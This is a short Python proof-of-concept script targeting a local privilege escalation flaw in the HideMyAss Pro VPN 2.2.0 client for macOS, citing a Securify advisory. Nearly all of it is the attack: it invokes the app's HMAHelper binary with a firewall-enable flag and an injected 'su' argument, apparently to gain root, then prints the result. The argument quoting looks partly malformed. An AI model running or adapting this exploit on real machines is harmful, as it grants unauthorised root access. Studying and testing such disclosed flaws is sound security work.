import pwd
import subprocess
import os 

'''
Reference: https://www.securify.nl/advisory/multiple-local-privilege-escalation-vulnerabilities-in-hidemyass-pro-vpn-client-v2x-for-os-x
'''

''' Execute Hide My Ass VPN 2.2.0 PoC '''
cmd_output = subprocess.run(["/Applications/HMA\\!\\ Pro\\ VPN.app/Contents/Resources/Applications/HMAHelper.app/Contents/MacOS/HMAHelper","--sib-firewall-enable","'su',"''""], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

''' Check Results '''
if cmd_output.stderr:
	print(cmd_output.stderr)

print(cmd_output.stdout)
